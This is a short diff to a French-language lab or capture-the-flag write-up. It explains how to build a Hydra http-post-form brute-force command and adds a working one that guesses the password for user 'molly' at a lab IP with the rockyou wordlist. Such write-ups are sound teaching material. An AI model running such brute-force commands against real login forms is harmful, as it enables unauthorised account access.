@@ -88,6 +88,9 @@ Le mieux est d'utiliser **burpsuite** pour intercepter la requête POST. Vous po
 
 #### Etape 2 : Lancer l'attaque avec les infos regroupées
 
+L'idée c'est de faire `login:` et de recopier la structure de la requête de connexion en remplaçant l'endroit où il y a l'username et le mdp par `^USER^` et `^PASS^` respectivement. On rajoute ensuite `:` suivie du message d'erreur à la fin.
+
 ```bash
-hydra -l pseudoAtester -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form "/login:=^USER^&password=^PASS^:Your username or password is incorrect."
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V
 ```
+
